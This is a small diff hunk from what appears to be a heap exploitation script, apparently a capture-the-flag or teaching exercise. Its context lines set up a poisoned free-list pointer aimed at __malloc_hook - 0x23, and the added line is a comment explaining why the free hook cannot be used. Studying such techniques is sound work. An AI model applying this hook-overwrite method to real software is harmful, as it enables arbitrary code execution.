@@ -103,6 +103,8 @@ free(a)
 a = malloc(size)
 write(a, p64(libc.symbols.__malloc_hook - 0x23))
 
+# Free Hook cannot be used because there are no useful metadata before it in the memory
+
 b = malloc(size)
 
 a = malloc(size)
